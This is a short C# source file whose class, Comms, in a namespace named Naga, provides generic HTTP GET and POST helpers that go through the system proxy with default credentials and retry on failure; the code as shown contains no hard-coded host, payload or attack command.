using System;
using System.IO;
using System.Net;

namespace Naga
{
    class Comms
    {
        public static byte[] HttpGet(Uri URL, string Endpoint = "")
        {
            Uri FullUrl = new Uri(URL, Endpoint);
#if DEBUG
            Console.WriteLine("[*] Attempting HTTP GET to {0}", FullUrl);
#endif
            return Retry.Do(() =>
            {
                using (var wc = new WebClient())
                {
                    wc.Proxy = WebRequest.GetSystemWebProxy();
                    wc.Proxy.Credentials = CredentialCache.DefaultCredentials;
                    byte[] data = wc.DownloadData(FullUrl);
#if DEBUG
                    Console.WriteLine("[*] Downloaded {0} bytes", data.Length);
#endif              
                    return data;
                }
            }, TimeSpan.FromSeconds(1), 10);
        }
        public static byte[] HttpPost(Uri URL, string Endpoint = "", byte[] payload = default(byte[]))
        {
            Uri FullUrl = new Uri(URL, Endpoint);
#if DEBUG
            Console.WriteLine("[*] Attempting HTTP POST to {0}", FullUrl);
#endif
            return Retry.Do(() =>
            {
                var wr = WebRequest.Create(FullUrl);
                wr.Proxy = WebRequest.GetSystemWebProxy();
                wr.Proxy.Credentials = CredentialCache.DefaultCredentials;
                wr.Method = "POST";
                if (payload.Length > 0)
                {
                    wr.ContentType = "application/octet-stream";
                    wr.ContentLength = payload.Length;
                    var requestStream = wr.GetRequestStream();
                    requestStream.Write(payload, 0, payload.Length);
                    requestStream.Close();
                }
                var response = wr.GetResponse();
                using (MemoryStream memstream = new MemoryStream())
                {
                    response.GetResponseStream().CopyTo(memstream);
                    return memstream.ToArray();
                }
            }, TimeSpan.FromSeconds(1), 10);
        }
    }
}
